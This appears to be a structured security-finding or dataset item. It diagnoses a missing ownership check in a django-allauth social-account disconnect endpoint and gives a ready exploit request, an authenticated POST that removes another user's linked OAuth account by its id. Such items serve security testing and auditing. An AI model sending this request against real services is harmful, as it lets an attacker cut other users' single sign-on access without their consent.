diagnosis: The endpoint retrieves a django-allauth SocialAccount by account_id and deletes it without verifying account.user == request.user. Any authenticated user can disconnect another user's linked OAuth credentials, breaking their single-sign-on access.
exploit_request:
POST /accounts/social/disconnect/ HTTP/1.1
Host: auth.example.com
Cookie: sessionid=attacker_session
Content-Type: application/x-www-form-urlencoded

account_id=621
